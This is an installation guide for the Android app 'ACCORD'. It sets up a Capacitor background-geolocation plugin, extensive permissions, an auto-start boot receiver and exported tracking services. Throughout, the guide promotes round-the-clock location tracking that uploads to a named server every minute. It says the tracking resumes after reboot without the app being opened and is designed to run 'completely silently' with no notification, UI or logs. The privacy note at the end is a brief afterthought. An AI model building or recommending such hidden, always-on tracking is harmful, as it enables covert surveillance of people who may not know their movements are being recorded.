# 🚀 Background Tracking Installation Guide

## Quick Start - 3 Simple Steps

The code is already implemented! Just follow these steps to enable native background tracking:

---

## ✅ Step 1: Install Plugin

Run these commands in your terminal:

```bash
npm install @capacitor-community/background-geolocation
npx cap sync
```

---

## ✅ Step 2: Update AndroidManifest.xml

Open: `android/app/src/main/AndroidManifest.xml`

**Add these permissions** (paste BEFORE `<application>` tag):

```xml
<!-- Location permissions -->
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

<!-- Storage permissions for location data -->
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />

<!-- Foreground service permissions (Android 9+) -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />

<!-- Boot and network permissions -->
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

<!-- Notification permissions (Android 13+) -->
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

<!-- Wake lock for background processing -->
<uses-permission android:name="android.permission.WAKE_LOCK" />
```

**Add boot receiver** (paste INSIDE `<application>` tag, before closing `</application>`):

```xml
<!-- Boot receiver - starts tracking when device boots -->
<receiver 
    android:name="com.transistorsoft.locationmanager.BootReceiver" 
    android:enabled="true" 
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

**Add foreground service** (paste INSIDE `<application>` tag):

```xml
<!-- Background tracking service -->
<service 
    android:name="com.transistorsoft.locationmanager.service.TrackingService"
    android:foregroundServiceType="location"
    android:enabled="true"
    android:exported="true" />

<service 
    android:name="com.transistorsoft.locationmanager.service.HeartbeatService"
    android:enabled="true"
    android:exported="true" />
```

---

## ✅ Step 3: Build and Test

```bash
# Build the APK
./build-apk.sh

# Install on your Android device
adb install android/app/build/outputs/apk/release/app-release.apk
```

---

## 📱 Testing the Background Tracking

### 1. Grant Permissions
When you first open the app:
- Login to your account
- When prompted for location permission, select **"Allow all the time"**
- When prompted for storage permission, select **"Allow"** (used to store location data)
- If you only see "Allow while using app", go to:
  - Settings → Apps → ACCORD → Permissions → Location → **Allow all the time**
  - Settings → Apps → ACCORD → Permissions → Storage → **Allow**

### 2. Test Background Tracking
1. ✅ Open the app and login
2. ✅ Close the app completely (swipe away from recent apps)
3. ✅ **No notification will appear** - tracking runs silently
4. ✅ Move around with your device
5. ✅ Check your backend - locations should be uploaded every ~60 seconds

### 3. Test Boot Tracking
1. ✅ Reboot your device
2. ✅ DON'T open the app
3. ✅ Move around - tracking should start automatically
4. ✅ **No notification will appear** - completely silent operation

---

## 🔋 Battery Optimization

The tracker is configured for **battery efficiency**:
- Updates every 60 seconds when moving
- Stops tracking when stationary for 5+ minutes
- Reduces frequency when on foot vs. in vehicle
- Batches locations before uploading

To improve battery life further:
1. Go to Settings → Apps → ACCORD → Battery
2. Select "Optimized" (not "Unrestricted")

---

## 🐛 Troubleshooting

### Issue: Tracking stops when app is closed
**Solution:** Make sure you granted "Allow all the time" permission

### Issue: App asks for storage permission
**Solution:** Grant storage permission - it's used to buffer location data offline

### Issue: Tracking doesn't start after reboot
**Solution:** 
1. Check if "Autostart" is enabled for ACCORD (varies by manufacturer)
2. Some devices (Xiaomi, Huawei, Oppo) aggressively kill background apps
3. Add ACCORD to "Protected apps" or "Autostart" list

### Issue: Location uploads failing
**Solution:**
1. Check internet connection
2. Verify backend endpoint `/api/location/track` is implemented
3. Check app logs: `adb logcat | grep BackgroundGeolocation`

---

## 📋 What Happens Behind the Scenes

### On App Start
1. `app/page.tsx` detects if running on Android
2. Starts `native-background-tracker.ts` (Android) or `aggressive-tracker.ts` (web)
3. Configures background geolocation plugin
4. Requests "Always" location permission

### During Background Tracking
1. GPS tracks location every 60 seconds (configurable)
2. Detects motion (moving/stationary/in_vehicle/on_foot)
3. Batches locations (up to 50) in local SQLite database
4. Uploads batch to `https://app.codewithseth.co.ke/api/location/track`
5. **Runs completely silently - no notification, no UI, no logs**

### On Device Boot
1. Boot receiver starts automatically
2. Previous tracking configuration is restored
3. Tracking resumes without opening the app
4. **Silent operation - no notification or indication**

---

## 📡 Backend Requirements

Your backend must implement: `POST /api/location/track`

See `BACKEND_LOCATION_ENDPOINT.md` for complete API specification.

Quick summary:
- Accepts JWT token in `Authorization: Bearer <token>` header
- OR accepts `userId` in request body
- Expects array of locations with timestamps
- Returns: `{ success: true, saved: number }`

---

## 🎉 You're Done!

Once installed, the app will:
- ✅ Track location 24/7 (even when closed)
- ✅ Auto-start on device boot
- ✅ Upload locations every 60 seconds
- ✅ Work offline (buffers up to 10,000 locations)
- ✅ Preserve battery (smart motion detection)
- ✅ **Run completely silently (no notifications, no UI, no logs)**
- ✅ Request storage permission for offline data buffering
- ✅ Request "Allow all the time" location permission

The user doesn't need to do anything - tracking is automatic after login!

---

## 🔒 Privacy Note

The app tracks location 24/7 in the background with **no visible notification**. Users must grant:
- **"Allow all the time"** location permission
- **Storage permission** to buffer location data

Make sure your privacy policy discloses silent background location tracking and data storage.
